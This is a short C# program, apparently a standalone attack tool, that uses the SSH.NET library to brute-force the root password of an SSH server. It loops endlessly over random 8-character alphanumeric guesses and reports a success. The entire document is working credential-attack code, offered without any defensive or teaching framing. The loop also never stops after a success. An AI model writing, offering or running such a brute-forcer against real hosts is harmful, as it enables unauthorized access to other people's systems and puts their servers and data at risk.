using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

class SSHBruteForce
{
    static void Main(string[] args)
    {
        string host = "example.com";
        int port = 22;

        Random random = new Random();
        const string passwordChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        HashSet<string> triedPasswords = new HashSet<string>();

        while (true)
        {
            StringBuilder password = new StringBuilder();
            for (int i = 0; i < 8; i++)
            {
                password.Append(passwordChars[random.Next(passwordChars.Length)]);
            }

            string passwordStr = password.ToString();

            if (triedPasswords.Contains(passwordStr))
            {
                Console.WriteLine(" [-] Already tried password: " + passwordStr);
                Thread.Sleep(1000);
                continue;
            }

            triedPasswords.Add(passwordStr);

            var connectionInfo = new ConnectionInfo(host, port, "root", new PasswordAuthenticationMethod("root", passwordStr));

            using (var client = new SshClient(connectionInfo))
            {
                try
                {
                    client.Connect();
                    Console.WriteLine(" [+] Password found: " + passwordStr);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(" [-] Connection failed: " + ex.Message);
                }
                finally
                {
                    client.Disconnect();
                }
            }

            Thread.Sleep(1000);
        }
    }
}